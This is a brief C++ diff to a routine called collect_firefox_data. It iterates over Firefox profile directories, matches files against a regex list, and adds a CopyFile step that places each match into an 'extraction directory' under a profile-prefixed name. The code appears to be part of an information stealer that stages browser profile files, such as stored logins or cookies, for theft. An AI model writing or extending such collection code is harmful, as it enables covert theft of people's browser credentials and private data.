@@ -120,14 +120,19 @@ void collect_firefox_data() {
 			profile_path_as_string = profile_path.path().string();
 			std::regex_match(profile_path_as_string.cbegin(), profile_path_as_string.cend(), sm, profile_regex);
 			profile_name = sm[3];
-
+			
 			for (const auto& file_path : fs::directory_iterator(profile_path.path().string())) {
 				desired_file_path_as_string = file_path.path().string();
 				for (std::regex i : regex_list) {
 					if (std::regex_match(desired_file_path_as_string.cbegin(), desired_file_path_as_string.cend(), sm, i)) {
 						desired_file_name = sm[2];
 						desired_file_name = profile_name + "_" + desired_file_name;
-						
+
+						CopyFile(
+							convert_to_wchar(desired_file_path_as_string.c_str()), 
+							convert_to_wchar((path_to_extraction_directory + "\\" + desired_file_name).c_str()),
+							1
+						);
 					}
 				}
 			}
